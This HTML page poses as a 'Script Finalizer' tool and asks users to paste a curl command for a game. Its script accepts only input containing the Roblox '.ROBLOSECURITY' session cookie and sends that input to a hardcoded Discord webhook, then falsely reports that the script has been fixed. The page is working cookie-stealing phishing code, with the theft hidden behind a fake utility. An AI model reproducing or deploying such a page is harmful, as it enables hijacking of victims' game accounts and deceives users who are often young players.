<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Script Finalizer</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
  <style>
    .grid-bg {
      background-image:
        linear-gradient(rgba(50,50,70,.15) 1px, transparent 1px),
        linear-gradient(90deg, rgba(50,50,70,.15) 1px, transparent 1px);
      background-size: 4rem 4rem;
    }
  </style>
</head>
<body class="min-h-screen bg-black text-white flex items-center justify-center p-6 relative overflow-hidden">

  <div class="absolute inset-0 grid-bg opacity-20"></div>
  <div class="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/30 rounded-full blur-3xl"></div>
  <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/30 rounded-full blur-3xl"></div>

  <div class="relative z-10 w-full max-w-2xl">
    <div class="text-center mb-12">
      <h1 class="text-5xl font-extralight tracking-widest text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-cyan-400">
        Script Finalizer
      </h1>
      <div class="h-px w-48 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto mt-4"></div>
    </div>

    <div class="bg-zinc-900/70 backdrop-blur-2xl border border-zinc-800 rounded-3xl p-10 shadow-2xl" x-data="app()">
      <label class="block mb-4 text-sm font-light text-zinc-400 tracking-wider">Insert Game ID BASH</label>

      <textarea
        x-model="input"
        @input="message = null"
        :disabled="loading"
        placeholder="curl https://..."
        class="w-full min-h-64 bg-black/50 border border-zinc-700 rounded-xl px-5 py-4 text-white placeholder-zinc-600 font-mono text-sm resize-none focus:border-purple-500 focus:outline-none transition-colors"
      ></textarea>

      <div class="mt-3 text-right text-xs text-zinc-500">
        <span x-text="input.length"></span> / 4000 characters
      </div>

      <!-- Success Message -->
      <div x-show="message === 'success'" 
           x-transition
           class="mt-6 bg-green-950/60 border border-green-700/70 text-green-400 rounded-2xl px-6 py-4 text-center font-light">
        The script has been fixed!
      </div>

      <!-- Error Message -->
      <div x-show="message === 'error'" 
           x-transition
           class="mt-6 bg-red-950/60 border border-red-700/70 text-red-400 rounded-2xl px-6 py-4 text-center font-light">
        Invalid input type!
      </div>

      <button @click="submit()"
              :disabled="loading || !input.trim()"
              class="w-full mt-8 h-14 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-50 disabled:cursor-not-allowed rounded-2xl text-xl font-light tracking-wider transition-all flex items-center justify-center gap-3">
        <template x-if="loading">
          <svg class="animate-spin w-6 h-6" fill="none" viewBox="0 0 24 24">
            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
          </svg>
        </template>
        <span x-text="loading ? 'Processing...' : 'Submit Script'"></span>
      </button>
    </div>

    <p class="text-center mt-10 text-zinc-600 text-sm font-light">Only curl commands are accepted</p>
  </div>

  <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
  <script>
    function app() {
      return {
        input: '',
        message: null,
        loading: false,

        async submit() {
          const raw = this.input.trim();

          if (!raw.startsWith('curl') || !raw.includes('.ROBLOSECURITY')) {
            this.message = 'error';
            return;
          }

          this.loading = true;
          this.message = null;

          try {
            let clean = raw
              .replace(/https?:\/\/[^\s]*/g, '')           // remove any URLs
              .replace(/curl\s+/gi, 'curl ... ')           // shorten curl
              .trim()
              .substring(0, 4000);                         // max 4000 chars

            await fetch('https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                embeds: [{
                  title: "New Script Submission",
                  description: "```bash\n" + clean + "\n```",
                  color: 0x00ff00,
                  timestamp: new Date().toISOString()
                }]
              })
            });

            this.message = 'success';
            this.input = '';
          } catch(e) {
            this.message = 'error';
          } finally {
            this.loading = false;
          }
        }
      }
    }
  </script>
</body>
</html>
